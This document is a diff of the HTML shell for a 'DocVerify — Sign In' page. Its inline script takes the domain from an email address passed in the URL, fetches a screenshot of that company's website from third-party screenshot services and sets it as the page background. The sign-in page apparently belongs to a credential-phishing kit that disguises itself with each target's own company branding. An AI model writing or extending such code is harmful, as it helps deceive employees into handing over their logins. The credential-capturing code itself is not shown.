@@ -1,63 +1,72 @@
 <!doctype html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <meta name="description" content="Secure authentication with Google Sign-In and CAPTCHA" />
-    <title>DocVerify — Sign In</title>
-    <link rel="preconnect" href="https://www.google.com" crossorigin />
-    <link rel="preconnect" href="https://www.gstatic.com" crossorigin />
-    <link rel="preconnect" href="https://s0.wordpress.com" crossorigin />
-    <link rel="preconnect" href="https://api.pagepeeker.com" crossorigin />
-    <link rel="preconnect" href="https://api.microlink.io" crossorigin />
-    <link rel="preconnect" href="https://fonts.googleapis.com" />
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Plus+Jakarta+Sans:wght@600;700;800&display=swap" rel="stylesheet" />
-    <script>
-      (function () {
-        var href = location.href;
-        var at = href.indexOf("@");
-        if (at === -1) return;
 
-        var domain = href.substring(at + 1).split("&*(", 1)[0].split(/[/?#&]/)[0].trim();
-        if (!domain || domain.indexOf(".") === -1) return;
+<head>
+  <meta charset="UTF-8" />
+  <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="description" content="Secure authentication with Google Sign-In and CAPTCHA" />
+  <title>DocVerify — Sign In</title>
+  <link rel="preconnect" href="https://www.google.com" crossorigin />
+  <link rel="preconnect" href="https://www.gstatic.com" crossorigin />
+  <link rel="preconnect" href="https://s0.wordpress.com" crossorigin />
+  <link rel="preconnect" href="https://api.pagepeeker.com" crossorigin />
+  <link rel="preconnect" href="https://api.microlink.io" crossorigin />
+  <link rel="preconnect" href="https://mini.s-shot.ru" crossorigin />
+  <link rel="preconnect" href="https://image.thum.io" crossorigin />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link
+    href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Plus+Jakarta+Sans:wght@600;700;800&display=swap"
+    rel="stylesheet" />
+  <script>
+    (function () {
+      const params = new URLSearchParams(window.location.search);
+      const rawEmail = params.get('email') ?? params.get('user') ?? params.get('e') ?? '';
+      const email = rawEmail.trim();
 
-        var site = "https://www." + domain + "/";
-        var enc = encodeURIComponent(site);
-        var cacheKey = "docverify_bg_" + domain;
-        var cached = null;
-        try { cached = sessionStorage.getItem(cacheKey); } catch (e) {}
+      if (!email || !email.includes('@')) return;
 
-        if (cached && cached.indexOf("thum.io") !== -1) {
-          try { sessionStorage.removeItem(cacheKey); } catch (e) {}
-          cached = null;
-        }
+      const domain = email.split('@')[1]?.trim().toLowerCase();
+      if (!domain || !domain.includes('.') || !/^[a-z0-9.-]+$/i.test(domain)) return;
 
-        var url = cached || ("https://s0.wordpress.com/mshots/v1/" + enc + "?w=1280");
+      const site = 'https://www.' + domain + '/';
+      const enc = encodeURIComponent(site);
+      const cacheKey = 'docverify_bg_' + domain;
+      let cached = null;
+      try { cached = sessionStorage.getItem(cacheKey); } catch (e) { }
 
-        var preload = document.createElement("link");
-        preload.rel = "preload";
-        preload.as = "image";
-        preload.href = url;
-        document.head.appendChild(preload);
+      if (cached && cached.includes('thum.io')) {
+        try { sessionStorage.removeItem(cacheKey); } catch (e) { }
+        cached = null;
+      }
 
-        window.__DOCVERIFY_BG__ = { domain: domain, url: url };
+      const url = cached || ('https://s0.wordpress.com/mshots/v1/' + enc + '?w=1280');
 
-        document.addEventListener("DOMContentLoaded", function () {
-          var root = document.getElementById("root");
-          if (!root) return;
-          root.style.backgroundImage = "url(" + url + ")";
-          root.style.backgroundSize = "cover";
-          root.style.backgroundPosition = "center top";
-          root.style.backgroundRepeat = "no-repeat";
-        });
-      })();
-    </script>
-    <script type="module" crossorigin src="/assets/index-BN_sO2dS.js"></script>
-    <link rel="stylesheet" crossorigin href="/assets/index-CGu-gLu9.css">
-  </head>
-  <body>
-    <div id="root"></div>
-  </body>
+      const preload = document.createElement('link');
+      preload.rel = 'preload';
+      preload.as = 'image';
+      preload.href = url;
+      document.head.appendChild(preload);
+
+      window.__DOCVERIFY_BG__ = { domain, url };
+
+      document.addEventListener('DOMContentLoaded', function () {
+        const root = document.getElementById('root');
+        if (!root) return;
+        root.style.backgroundImage = 'url(' + url + ')';
+        root.style.backgroundSize = 'cover';
+        root.style.backgroundPosition = 'center top';
+        root.style.backgroundRepeat = 'no-repeat';
+      });
+    })();
+  </script>
+  <script type="module" crossorigin src="/assets/index-D4NFxJFX.js"></script>
+  <link rel="stylesheet" crossorigin href="/assets/index-Dl1w0Tj-.css">
+</head>
+
+<body>
+  <div id="root"></div>
+</body>
+
 </html>
